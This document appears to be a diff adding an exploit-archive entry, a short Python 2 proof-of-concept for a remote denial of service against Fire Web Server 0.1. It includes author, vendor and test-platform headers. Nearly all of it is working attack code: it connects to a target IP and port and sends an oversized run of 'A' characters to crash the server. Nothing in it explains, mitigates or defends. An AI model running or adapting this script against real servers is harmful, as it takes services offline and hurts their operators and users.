@@ -1,0 +1,20 @@
+# Exploit Title: Fire Web Server 0.1 - Remote Denial of Service (PoC)
+# Date: 2020-06-26
+# Exploit Author: Saeed reza Zamanian
+# Vendor Homepage: https://sourceforge.net/projects/firewebserver/
+# Software Link: https://sourceforge.net/projects/firewebserver/files/
+# Version: Pre-Alpha
+# Tested on: Windows 7 , Windows Vista
+
+#!/usr/bin/python
+  
+import socket,os,sys
+
+if len(sys.argv) < 3:
+	print "Usage: python fwspa_dos.py targetIP targetPort"
+else:
+	print "[*] Sending evil http request to target"
+	expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+	expl.connect((sys.argv[1], int(sys.argv[2])))
+	expl.send("A"*1015)	
+	expl.close()
